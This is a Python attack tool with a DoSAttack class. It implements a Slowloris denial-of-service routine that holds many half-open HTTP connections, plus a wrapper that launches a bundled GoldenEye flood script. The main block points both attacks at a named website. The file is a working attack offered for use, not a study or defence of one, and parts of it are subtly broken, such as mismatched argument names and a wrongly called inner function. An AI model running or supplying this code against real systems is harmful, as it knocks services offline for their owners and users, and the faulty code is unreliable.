import socket
import random
import logging
import subprocess
from urllib.parse import urlparse
import os


logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DoSAttack:
    def __init__(self):
        self.threads = []

    def send_line(self, s, line):
        line = f"{line}\r\n"
        s.send(line.encode("utf-8"))

    def send_header(self, s, name, value):
        self.send_line(s, f"{name}: {value}")

    def _get_ip(self, url):
        try:
            parsed_url = urlparse(url)
            if not parsed_url.netloc:
                parsed_url = urlparse("http://" + url)
            hostname = parsed_url.netloc
            return socket.gethostbyname(hostname)
        except Exception as e:
            return f"Error: {e}"

    def _is_ip(self, address):
        try:
            socket.inet_aton(address)
            return True
        except socket.error:
            return False

    def slowloris_attack(self, target, target_port, num_connections=100):
        def read_user_agents(file_name):
            user_agents = []
            with open(file_name, "r") as file:
                for line in file:
                    user_agents.append(line.strip())
            return user_agents

        path = os.path.join(os.path.dirname(__file__), "data/useragents.txt")
        user_agents = read_user_agents(path)
        list_of_sockets = []

        def init_socket(ip: str):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, target_port))
            self.send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
            ua = random.choice(user_agents)
            self.send_header(s, "User-Agent", ua)
            self.send_header(s, "Accept-language", "en-US,en,q=0.5")
            return s

        def slowloris_iteration(self):
            logging.info("Sending keep-alive headers...")
            logging.info("Socket count: %s", len(list_of_sockets))

            # Try to send a header line to each socket
            for s in list(list_of_sockets):
                try:
                    self.send_header(s, "X-a", random.randint(1, 5000))
                except socket.error:
                    list_of_sockets.remove(s)

            # Some of the sockets may have been closed due to errors or timeouts.
            # Re-create new sockets to replace them until we reach the desired number.

            diff = num_connections - len(list_of_sockets)
            if diff <= 0:
                return

            logging.info("Creating %s new sockets...", diff)
            for _ in range(diff):
                try:
                    if not self._is_ip(target):
                        target = self._get_ip(target)
                        if "Error" in target:
                            logging.error(f"Invalid target: {target}")
                            return

                    ip = target
                    s = init_socket(ip)
                    if not s:
                        continue
                    list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug("Failed to create new socket: %s", e)
                    break

        if not self._is_ip(target):
            target = self._get_ip(target)
            if "Error" in target:
                logging.error(f"Invalid target: {target}")
                return

        ip = target
        socket_count = num_connections
        logging.info("Attacking %s with %s sockets.", ip, socket_count)
        for _ in range(socket_count):
            try:
                logging.debug("Creating socket nr %s", _)
                s = init_socket(ip)
            except socket.error as e:
                logging.debug(e)
                break
            list_of_sockets.append(s)

        while True:
            try:
                slowloris_iteration()
            except (KeyboardInterrupt, SystemExit):
                logging.info("Stopping Slowloris")
                break
            except Exception as e:
                logging.debug("Error in Slowloris iteration: %s", e)

    def slowhttptest_attack(self):
        raise NotImplementedError

    def hulk_attack(self):
        raise NotImplementedError

    def goldeneye_attack(
        self,
        url,
        user_agents=None,
        workers=10,
        sockets=500,
        method="get",
        nosslcheck=True,
    ):
        logging.info("Attacking %s with GoldenEye...", url)
        path = os.path.join(os.path.dirname(__file__), "DOS/goldeneye.py")
        command = [
            "python3",
            path,
            url,
            "-u" if user_agents else "",
            str(user_agents) if user_agents else "",
            "-w",
            str(workers),
            "-s",
            str(sockets),
            "-m",
            method,
            "-n",
            str(nosslcheck),
        ]
        print(" ".join(command))
        subprocess.run(command)


if __name__ == "__main__":
    dos = DoSAttack()  # target_url, num_connections, attack_type
    dos.slowloris_attack(url="https://panthon.app", target_port=80, num_connections=100)
    dos.goldeneye_attack(url="https://panthon.app")
